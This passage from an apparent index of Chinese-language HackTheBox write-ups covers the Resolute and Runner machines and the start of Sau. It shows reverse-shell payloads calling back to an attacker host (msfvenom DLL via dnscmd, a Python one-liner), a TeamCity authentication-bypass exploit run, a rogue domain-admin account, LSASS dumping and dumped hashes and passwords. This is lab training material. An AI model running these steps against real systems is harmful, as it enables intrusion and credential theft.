[NT] 494c49c3a53e33a778f647dafac797b3 | [SHA1] 9db10cb704876ac0df5eb34853cc54e353920152\n[+] HTB.LOCAL HTB\\Administrator        [NT] 8b89333aa775584fdc5b5b0acdace063 | [SHA1] 58413d54bf1c8e5098e72fdfc4c8d47cc5775bc4\n[+] HTB.LOCAL HTB.LOCAL\\Administrator  [PWD] Cr4ckMeIfYouC4n!\n[+] HTB.LOCAL HTB\\nico                 [NT] cd88c7b4b819442a1e0ad041d4675aee | [SHA1] 118f938e7dbe0b6c12ba16414c8f6fc67c29fb8c\n[+] HTB.LOCAL HTB\\REEL$                [NT] 9fcf6992b154c8f754b5d569641fd52d | [SHA1] faaf23560d8898cb51fd3156e9a01d975a463083\n[+] HTB.LOCAL HTB.LOCAL\\REEL$          [PWD] 4b2f092a476efe35edb1c4b2f4c10ff3f0ccb4ce3c47fa2dbc9524eea5f37a914bcca4e1a3d0d41dfc876da61dd13e967e9e57df9f5062720ecbd554e5434b9dc4923e306fb32553557656dd67d12ae076eb110568ba76afbeac049e5298fe5fa3393169390b1c7bc12ca38d2068b106f2ba21462519c99931788cce534ad7e0852a781832571581e20735f50a7b1a3cb94a8e1701bc612bd60961268cf6eb1a178f1c90fd2531a1f3576da60dcd96ed58e8c042f7ab7485091eaca966e562f8246a05ba0d3367318c20d5ec67d78dfb29ef3b033121307e80929d7997cff51fecd0d69e38b526f4389afe096351c1c9\n[+] HTB.LOCAL HTB\\REEL$                [NT] f32e4ac829de6d7a0da8afe4bf952ff0 | [SHA1] 3197f99d71c2698a1215e10bd95ed6f2f0e34f93\n[+] HTB.LOCAL HTB.LOCAL\\REEL$          [PWD] dd31f4d28dfb15fac136c658ae3eacebb033c17884a003e6a386f3b98fa84ee8ef3cc6582bd9debb32569db14cc9e3db022b6c35fa4070bc22af280e954e5dcf365604a1fcb86bc3c91c3773ccc76450622aa4a4bd7e245771f0886713cd512cc52bb386ef62c216ad1e620bd263fb5b0476a86e925ba0a8e82ddba782e32fb2c2cc7d4a2ed79d57b022ec5972af39c3b8c0dfc85e45e64696fa751bef46f4dceac1567475013aa5aa12a8a46ae1202040722877efe16e565745f27a7aa1ba5df6ff07a9357c4856c280b2fadc17f8590dd445e00d110059ee6c041dc512db901958dce70b23b99f05fd7ebb6205f8e4\n</code></pre>"}, {"location": "HackTheBox/Machines/Resolute/", "title": "Resolute", "text": ""}, {"location": "HackTheBox/Machines/Resolute/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.169 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE  SERVICE      VERSION\n88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-12 07:55:38Z)\n135/tcp   open   msrpc        Microsoft Windows RPC\n139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)\n464/tcp   open   kpasswd5?\n593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open   tcpwrapped\n3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n3269/tcp  open   tcpwrapped\n5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open   mc-nmf       .NET Message Framing\n47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open   msrpc        Microsoft Windows RPC\n49665/tcp open   msrpc        Microsoft Windows RPC\n49666/tcp open   msrpc        Microsoft Windows RPC\n49667/tcp open   msrpc        Microsoft Windows RPC\n49671/tcp open   msrpc        Microsoft Windows RPC\n49678/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49679/tcp open   msrpc        Microsoft Windows RPC\n49684/tcp open   msrpc        Microsoft Windows RPC\n49707/tcp closed unknown\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\n...\nNetwork Distance: 2 hops\nService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Resolute\n|   NetBIOS computer name: RESOLUTE\\x00\n|   Domain name: megabank.local\n|   Forest name: megabank.local\n|   FQDN: Resolute.megabank.local\n|_  System time: 2024-01-11T23:56:51-08:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-12T07:56:52\n|_  start_date: 2024-01-12T07:52:54\n|_clock-skew: mean: 2h47m00s, deviation: 4h37m09s, median: 6m59s\n</code></pre> - <code>crackmapexec smb $IP -u guest -p '' --shares</code>  - <code>ldapsearch</code> <pre><code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts\n---\ndn:\nnamingContexts: DC=megabank,DC=local\nnamingContexts: CN=Configuration,DC=megabank,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local\nnamingContexts: DC=DomainDnsZones,DC=megabank,DC=local\nnamingContexts: DC=ForestDnsZones,DC=megabank,DC=local\n\nldapsearch -x -H \"ldap://$IP\" -b \"DC=megabank,DC=local\" &gt; ldap_megabank_local.txt\ncat ldap_megabank_local.txt | grep userPrincipalName\n---\nuserPrincipalName: ryan@megabank.local\nuserPrincipalName: marko@megabank.local\nuserPrincipalName: sunita@megabank.local\nuserPrincipalName: abigail@megabank.local\nuserPrincipalName: marcus@megabank.local\nuserPrincipalName: sally@megabank.local\nuserPrincipalName: fred@megabank.local\nuserPrincipalName: angela@megabank.local\nuserPrincipalName: felicia@megabank.local\nuserPrincipalName: gustavo@megabank.local\nuserPrincipalName: ulf@megabank.local\nuserPrincipalName: stevie@megabank.local\nuserPrincipalName: claire@megabank.local\nuserPrincipalName: paulo@megabank.local\nuserPrincipalName: steve@megabank.local\nuserPrincipalName: annette@megabank.local\nuserPrincipalName: annika@megabank.local\nuserPrincipalName: per@megabank.local\nuserPrincipalName: claude@megabank.local\nuserPrincipalName: melanie@megabank.local\nuserPrincipalName: zach@megabank.local\nuserPrincipalName: simon@megabank.local\nuserPrincipalName: naoki@megabank.local\n\ncat ldap_megabank_local.txt | grep 'OU=Service Accounts'\ncat ldap_megabank_local.txt | grep assw\n---\n...\nbadPasswordTime: 0\ndescription: Account created. Password set to Welcome123!\nbadPasswordTime: 0\n...\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Resolute/#shell-as-user-melanie", "title": "Shell as User - melanie", "text": "<ul> <li>\u5bc6\u7801\u55b7\u5c04 </li> <li><code>evil-winrm -i $IP -u 'melanie' -p 'Welcome123!'</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Resolute/#shell-as-user-ryan", "title": "Shell as User - ryan", "text": "<ul> <li>\u905b\u72d7\uff0c\u53d1\u73b0\u8fd9\u4e2a\u7528\u6237\u6ca1\u5565\u6743\u9650 </li> <li>\u8dd1\u4e00\u4e0b WinPeas \u6ca1\u6709\u53ef\u5229\u7528\u7684\u4fe1\u606f</li> <li>\u67e5\u770b\u672c\u5730\u6587\u4ef6\uff0c\u53d1\u73b0 PSTranscripts \u76ee\u5f55 </li> <li>\u53d1\u73b0 ryan \u7528\u6237\u51ed\u636e </li> <li><code>evil-winrm -i $IP -u ryan -p 'Serv3r4Admin4cc123!'</code> </li> <li>\u53d1\u73b0\u6b64\u7528\u6237\u4e3a DNS \u7ba1\u7406\u5458 </li> </ul>"}, {"location": "HackTheBox/Machines/Resolute/#shell-as-root", "title": "Shell as Root", "text": "<p>ryan \u662f DNS \u7ba1\u7406\u5458\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 dnscmd.exe \u6307\u5b9a\u5e94\u7531 DNS \u52a0\u8f7d\u7684\u63d2\u4ef6 DLL \u53cd\u5f39 Shell - \u751f\u6210 reverse shell dll \u6587\u4ef6 <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.18 LPORT=2233 -f dll -o good.dll</code> - \u542f\u52a8 smb \u670d\u52a1  - \u5229\u7528 dnscmd.exe \u52a0\u8f7d good.dll\uff0c\u91cd\u542f\u670d\u52a1\u83b7\u53d6 shell <pre><code>dnscmd.exe localhost /config /serverlevelplugindll \\\\10.10.16.18\\good\\good.dll\nsc.exe stop dns\nsc.exe start dns\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Resolute/#dump-hash", "title": "Dump Hash", "text": "<ul> <li>\u6dfb\u52a0\u57df\u7ba1 <pre><code>net user newboy Admin@123 /add /domain\nnet group \"domain admins\" newboy /add /domain\n</code></pre></li> <li><code>lsassy megabank.local -u newboy -p 'Admin@123' -dc-ip $IP</code> <pre><code>[+] megabank.local Authentication successful\n[+] megabank.local Lsass dumped in C:\\Windows\\Temp\\jY2.sys (148886946 Bytes)\n[+] megabank.local Lsass dump deleted\n[+] megabank.local MEGABANK\\RESOLUTE$            [NT] 84ab27f4fa73cd812c44dd4f3c141f6c | [SHA1] a1bb1366976dc62859f90e015ded4509cb2c46cc\n[+] megabank.local MEGABANK\\Administrator        [NT] fb3b106896cdaa8a08072775fbd9afe9 | [SHA1] 03006b77aacca0a1e25f4134c6e2f1ef13a82a19\n[+] megabank.local megabank.local\\Administrator  [PWD] DontH4ckUsPleeze!\n</code></pre></li> </ul>"}, {"location": "HackTheBox/Machines/Runner/", "title": "Runner", "text": ""}, {"location": "HackTheBox/Machines/Runner/#1-nmap-scan", "title": "1. Nmap Scan", "text": "<pre><code>PORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp   open  http        nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://runner.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n8000/tcp open  nagios-nsca Nagios NSCA\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>\u626b\u5230\u4e86 22\u300180\u30018000\uff0cUDP \u672a\u626b\u5230\u7aef\u53e3\u3002</p>"}, {"location": "HackTheBox/Machines/Runner/#2-http-8000", "title": "2. HTTP - 8000", "text": "<pre><code>feroxbuster -u http://runner.htb:8000/ -d 1                                 \n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.10.2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://runner.htb:8000/\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.10.2\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 1\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n200      GET        1l        1w        3c http://runner.htb:8000/health\n200      GET        1l        1w        9c http://runner.htb:8000/version\n</code></pre> <p>\u5148\u770b\u975e\u5e38\u89c4\u7aef\u53e3\uff0c\u626b\u63cf\u76ee\u5f55\u672a\u53d1\u73b0\u6709\u8da3\u7684\u4e1c\u897f\u3002</p> <pre><code>$ curl http://runner.htb:8000/health          \nOK\n\n$ curl http://runner.htb:8000/version\n0.0.0-src\n</code></pre>"}, {"location": "HackTheBox/Machines/Runner/#3-http-80-runnerhtb", "title": "3. HTTP - 80 - runner.htb", "text": "<p>\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u529f\u80fd\u70b9\u3002</p>"}, {"location": "HackTheBox/Machines/Runner/#4-subdomain-fuzz", "title": "4. Subdomain Fuzz", "text": "<pre><code>cewl http://runner.htb/ -w subdomain.dict\nffuf -w subdomain.dict -u \"http://runner.htb/\" -H 'Host: FUZZ.runner.htb' -fc 302\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://runner.htb/\n :: Wordlist         : FUZZ: /home/kali/Desktop/HackTheBox/Runner/hosts.txt\n :: Header           : Host: FUZZ.runner.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 302\n________________________________________________\n\nTeamCity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 196ms]\n:: Progress: [285/285] :: Job [1/1] :: 222 req/sec :: Duration: [0:00:01] :: Errors: 0 ::\n</code></pre> <p>\u7531\u4e8e seclists \u7684 subdomains-top1million-110000.txt \u5b57\u5178\u626b\u63cf\u4e0d\u5230\u7ed3\u679c\uff0c\u8f6c\u800c\u5c1d\u8bd5\u6293\u53d6 web \u9875\u9762\u7684\u5355\u8bcd\uff0c\u5f97\u5230\u65b0\u7684\u5b50\u57df\u540d\u3002</p>"}, {"location": "HackTheBox/Machines/Runner/#5-http-80-teamcityrunnerhtb", "title": "5. HTTP - 80 - teamcity.runner.htb", "text": "<p>\u53d1\u73b0\u4e00\u4e2a Jetbrains \u7684 TeamCity Version 2023.05.3 (build 129390)</p> <p>\u641c\u7d22\u6f0f\u6d1e\u53d1\u73b0 CVE-2024-27198 &amp; CVE-2024-27199 \u8ba4\u8bc1\u7ed5\u8fc7 + RCE</p> <pre><code>python3 w01.py -t http://teamcity.runner.htb/                                 \n\n _____                     ____ _ _           ____   ____ _____                                                                                                |_   _|__  __ _ _ __ ___  / ___(_) |_ _   _  |  _ \\ / ___| ____|               \n  | |/ _ \\/ _` | '_ ` _ \\| |   | | __| | | | | |_) | |   |  _|  \n  | |  __/ (_| | | | | | | |___| | |_| |_| | |  _ &lt;| |___| |___ \n  |_|\\___|\\__,_|_| |_| |_|\\____|_|\\__|\\__, | |_| \\_\\\\____|_____|               \n                                      |___/                     \n                                                                            Author: @W01fh4cker\n                                                                            Github: https://github.com/W01fh4cker\n\n[+] User added successfully, username: 4n88ltpb, password: q7fYliAJsN, user ID: 17\n[+] The target operating system version is linux                               \n[+] Please start executing commands freely! Type &lt;quit&gt; to end command execution                                                                               \ncommand &gt; whoami\ntcuser\ncommand &gt; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n</code></pre> <p>exp \u6ce8\u518c\u4e86\u4e00\u4e2a\u65b0\u7528\u6237 <code>4n88ltpb/q7fYliAJsN</code>\uff0c\u53cd\u5f39 shell \u53d1\u73b0\u662f\u4e00\u4e2a docker \u5bb9\u5668\u3002</p> <pre><code>$ ls -la /\ndrwxr-xr-x   1 root   root   4096 Feb 28 19:05 .\ndrwxr-xr-x   1 root   root   4096 Feb 28 19:05 ..\nlrwxrwxrwx   1 root   root      7 Aug  1  2023 bin -&gt; usr/bin\ndrwxr-xr-x   2 root   root   4096 Apr 15  2020 boot\ndrwxr-xr-x   3 root   root   4096 Aug 24  2023 data\ndrwxr-xr-x   5 root   root    340 Apr 21 11:22 dev\n-rwxr-xr-x   1 root   root      0 Feb 28 19:05 .dockerenv\ndrwxr-xr-x   1 root   root   4096 Feb 28 19:05 etc\ndrwxr-xr-x   2 root   root   4096 Apr 15  2020 home\nlrwxrwxrwx   1 root   root      7 Aug  1  2023 lib -&gt; usr/lib\nlrwxrwxrwx   1 root   root      9 Aug  1  2023 lib32 -&gt; usr/lib32\nlrwxrwxrwx   1 root   root      9 Aug  1  2023 lib64 -&gt; usr/lib64\nlrwxrwxrwx   1 root   root     10 Aug  1  2023 libx32 -&gt; usr/libx32\ndrwxr-xr-x   2 root   root   4096 Aug  1  2023 media\ndrwxr-xr-x   2 root   root   4096 Aug  1  2023 mnt\ndrwxr-xr-x   1 root   root   4096 Aug 24  2023 opt\ndr-xr-xr-x 296 root   root      0 Apr 21 11:22 proc\ndrwx------   2 root   root   4096 Aug  1  2023 root\ndrwxr-xr-x   1 root   root   4096 Aug 24  2023 run\n-rwxr-xr-x   1 root   root   1103 Aug 24  2023 run-server.sh\n-rwxr-xr-x   1 root   root    286 Aug 24  2023 run-services.sh\nlrwxrwxrwx   1 root   root      8 Aug  1  2023 sbin -&gt; usr/sbin\ndrwxr-xr-x   1 tcuser tcuser 4096 Aug 24  2023 services\ndrwxr-xr-x   2 root   root   4096 Aug  1  2023 srv\ndr-xr-xr-x  13 root   root      0 Apr 21 11:22 sys\ndrwxrwxrwt   1 root   root   4096 Apr 21 14:28 tmp\ndrwxr-xr-x   1 root   root   4096 Aug 24  2023 usr\ndrwxr-xr-x   1 root   root   4096 Aug  1  2023 var\n-rwxr-xr-x   1 root   root    280 Aug 24  2023 welcome.sh\n</code></pre> <p>\u641c\u7d22\u654f\u611f\u6587\u4ef6\uff0c\u53d1\u73b0 id_rsa</p> <pre><code>$ find / -name 'id_rsa' 2&gt;/dev/null\n/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa\n</code></pre> <p>\u4f46\u662f\u7f3a\u5c11\u7528\u6237\u540d\uff0c\u8fd4\u56de TeamCity \u7684 Web \u754c\u9762\uff0c\u5c1d\u8bd5\u767b\u5f55\u67e5\u627e\u7528\u6237\u540d</p> <p></p> <p>\u53d1\u73b0 John\u3001Matthew \u7528\u6237\u548c\u4e00\u4e2a\u6709\u8da3\u7684\u5907\u4efd\u529f\u80fd\uff0c\u6709\u53ef\u80fd\u5305\u542b\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u56e0\u6b64\u5c1d\u8bd5\u5907\u4efd\u3002</p> <p></p> <pre><code>$ sudo cat database_dump/users\nID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM\n1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1713699786309, BCRYPT\n2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT\n11, h454nsec4600, $2a$07$NlT58YZSMGvj3uAxf0S46OCx3KStvv8wi7hoUZW/V8jE4COJvie96, , \"\", 1713699802457, BCRYPT\n</code></pre> <p>\u89e3\u538b\u540e\u53d1\u73b0\u7528\u6237 Hash\uff0c\u4f7f\u7528 hashcat \u7206\u7834\u5f97\u5230 matthew \u7684\u5bc6\u7801\u4e3a <code>piper123</code></p>"}, {"location": "HackTheBox/Machines/Runner/#6-user-john", "title": "6. User - John", "text": "<p>\u4f7f\u7528\u5bc6\u7801\u767b\u5f55 matthew \u5931\u8d25\uff0c\u4f7f\u7528\u5bc6\u94a5\u767b\u5f55 john \u6210\u529f</p> <pre><code>$ ss -lntp | awk '{print $4}'\nLocal\n127.0.0.1:9000\n127.0.0.1:5005\n127.0.0.1:8111\n0.0.0.0:80\n0.0.0.0:22\n127.0.0.53%lo:53\n127.0.0.1:9443\n*:8000\n[::]:80\n[::]:22\n\n$ cat /etc/hosts\n127.0.0.1 localhost\n127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb\n</code></pre> <p>\u4fe1\u606f\u6536\u96c6\u53d1\u73b0\u672c\u5730\u8fd8\u6709\u5176\u4ed6\u7aef\u53e3\uff0c\u67e5\u770b hosts \u53d1\u73b0\u5176\u4ed6\u5b50\u57df\u540d\u3002</p>"}, {"location": "HackTheBox/Machines/Runner/#7-http-80-portainer-administrationrunnerhtb", "title": "7. HTTP - 80 - portainer-administration.runner.htb", "text": "<p>\u53d1\u73b0 portainer.io\uff0cMatthew \u7528\u6237\u53ef\u4ee5\u6210\u529f\u767b\u5f55\uff0c\u62ff\u5230\u4e86\u5bb9\u5668\u6743\u9650\u540e\uff0c\u9996\u5148\u8003\u8651\u5230\u6302\u5728\u4e3b\u673a\u7684 / \u76ee\u5f55\uff0c\u7136\u540e chroot \u9003\u9038</p> <p></p> <p>\u7531\u4e8e\u9009\u9879\u4e2d\u4e0d\u80fd\u76f4\u63a5\u6302\u5728\u4e3b\u673a\u76ee\u5f55\uff0c\u56e0\u6b64\u9700\u8981\u6dfb\u52a0\u989d\u5916\u7684 driver options</p> <p>https://stackoverflow.com/questions/39496564/docker-volume-custom-mount-point</p> <p>\u5728 docker compose \u6587\u4ef6\u4e2d\u53d1\u73b0\u4ee5\u4e0b\u7247\u6bb5</p> <pre><code>...\nvolumes:\n  bind-test:\n    driver: local\n    driver_opts:\n      type: none\n      o: bind\n      device: /home/user/test\n...\n</code></pre> <p></p> <p>\u67e5\u770b\u672c\u5730\u955c\u50cf\u6587\u4ef6</p> <p></p> <p>\u521b\u5efa\u4e00\u4e2a Ubuntu \u5bb9\u5668\uff0c\u5e76\u6302\u8f7d\u521a\u521a\u521b\u5efa\u7684\u5377</p> <p></p> <p>\u8fdb\u5165\u5bb9\u5668\u63a7\u5236\u53f0\uff0c\u9009\u62e9 root \u7528\u6237\uff0c<code>chroot /pwn bash</code> \u6210\u529f\u9003\u9038</p> <p></p>"}, {"location": "HackTheBox/Machines/Runner/#8-dump-hash", "title": "8. Dump Hash", "text": "<pre><code># cat /etc/shadow\nroot:$y$j9T$ANKO0Lgp1HOfm5nPIRoTX.$S4tkxOzaYLCUAy8deQR/4sayinxeXoQb.nGRDMGUa30:19788:0:99999:7:::\ndaemon:*:19405:0:99999:7:::\nbin:*:19405:0:99999:7:::\nsys:*:19405:0:99999:7:::\nsync:*:19405:0:99999:7:::\ngames:*:19405:0:99999:7:::\nman:*:19405:0:99999:7:::\nlp:*:19405:0:99999:7:::\nmail:*:19405:0:99999:7:::\nnews:*:19405:0:99999:7:::\nuucp:*:19405:0:99999:7:::\nproxy:*:19405:0:99999:7:::\nwww-data:*:19405:0:99999:7:::\nbackup:*:19405:0:99999:7:::\nlist:*:19405:0:99999:7:::\nirc:*:19405:0:99999:7:::\ngnats:*:19405:0:99999:7:::\nnobody:*:19405:0:99999:7:::\n_apt:*:19405:0:99999:7:::\nsystemd-network:*:19405:0:99999:7:::\nsystemd-resolve:*:19405:0:99999:7:::\nmessagebus:*:19405:0:99999:7:::\nsystemd-timesync:*:19405:0:99999:7:::\npollinate:*:19405:0:99999:7:::\nsshd:*:19405:0:99999:7:::\nsyslog:*:19405:0:99999:7:::\nuuidd:*:19405:0:99999:7:::\ntcpdump:*:19405:0:99999:7:::\ntss:*:19405:0:99999:7:::\nlandscape:*:19405:0:99999:7:::\nfwupd-refresh:*:19405:0:99999:7:::\nusbmux:*:19474:0:99999:7:::\nlxd:!:19474::::::\nmatthew:$y$j9T$VcVx4oj6/0sr8ldYLVrdx1$xNznv.vvbyLEM8S6/YKAfPHP6hoYg3oD1MWRNovVlx/:19781:0:99999:7:::\njohn:$y$j9T$rpK6N7DunMYlKLZJcOzCY1$lcPx9lbvGZBnn7ip/qQDho2NCF/UsOmYc1P2Ve/y6F2:19781:0:99999:7:::\n_laurel:!:19817::::::\n</code></pre>"}, {"location": "HackTheBox/Machines/Sau/", "title": "Sau", "text": ""}, {"location": "HackTheBox/Machines/Sau/#recon", "title": "Recon", "text": "<ul> <li><code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.224</code> <pre><code># Nmap 7.94SVN scan initiated Tue Jan  2 09:35:58 2024 as: nmap -sC -A -p22,80,8338,55555, -oN nmap.txt --append-out 10.10.11.224\nNmap scan report for 10.10.11.224\nHost is up (0.22s latency).\n\nPORT      STATE    SERVICE VERSION\n22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)\n|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)\n|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)\n80/tcp    filtered http\n8338/tcp  filtered unknown\n55555/tcp open     unknown\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     X-Content-Type-Options: nosniff\n|     Date: Tue, 02 Jan 2024 01:36:46 GMT\n|     Content-Length: 75\n|     invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$\n|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 302 Found\n|     Content-Type: text/html; charset=utf-8\n|     Location: /web\n|     Date: Tue, 02 Jan 2024 01:36:15 GMT\n|     Content-Length: 27\n|     href=\"/web\"&gt;Found&lt;/a&gt;.\n|   HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Allow: GET, OPTIONS\n|     Date: Tue, 02 Jan 2024 01:36:16 GMT\n|_    Content-Length: 0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port55555-TCP:V=7.94SVN%I=7%D=1/2%Time=6593688F%P=x86_64-pc-linux-gnu%r\nSF:(GetRequest,A2,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/html\nSF:;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x\nSF:202024\\x2001:36:15\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20href=\\\"\nSF:/web\\\"&gt;Found&lt;/a&gt;\\.\\n\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20\nSF:Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\nSF:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,60,\"HTTP/1\\.0\\x2\nSF:0200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Tue,\\x2002\\x20Jan\\x\nSF:202024\\x2001:36:16\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPReque\nSF:st,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plai\nSF:n;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reques\nSF:t\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(SSLSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x2